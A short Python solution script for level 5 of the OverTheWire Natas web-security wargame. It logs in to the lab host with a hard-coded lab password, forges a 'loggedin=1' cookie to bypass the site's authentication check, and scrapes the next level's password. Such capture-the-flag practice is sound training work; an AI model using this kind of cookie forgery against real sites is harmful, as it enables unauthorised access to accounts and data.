import requests
import re #regular expression

username = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

url = 'http://%s.natas.labs.overthewire.org' % username

# Cookies

cookies = { "loggedin" : "1" }

# auth = (user,pass) HTTP Basic Auth

reponse = requests.get(url, auth = (username, password), cookies=cookies)

content = reponse.text

#print(content)

print(re.findall('The password for natas6 is (.*)</div>', content)[0])
